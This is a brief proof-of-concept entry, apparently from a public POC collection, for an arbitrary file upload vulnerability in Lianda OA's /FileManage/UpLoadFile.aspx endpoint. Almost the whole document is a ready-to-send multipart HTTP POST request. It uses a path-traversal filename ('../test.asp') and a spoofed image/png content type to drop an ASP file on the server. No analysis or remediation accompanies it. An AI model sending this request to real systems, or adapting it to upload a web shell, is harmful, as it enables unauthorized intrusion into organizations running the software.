# lianda_UpLoadFile_fileupload

from : https://github.com/wy876/POC/blob/main/%E8%81%94%E8%BE%BEOA-UpLoadFile.aspx%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
2024.4.1 @2 
```
POST /FileManage/UpLoadFile.aspx HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.1707.77 Safari/537.36
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 241
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="DesignId"

1
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="../test.asp"
Content-Type: image/png

test
--00content0boundary00--
```
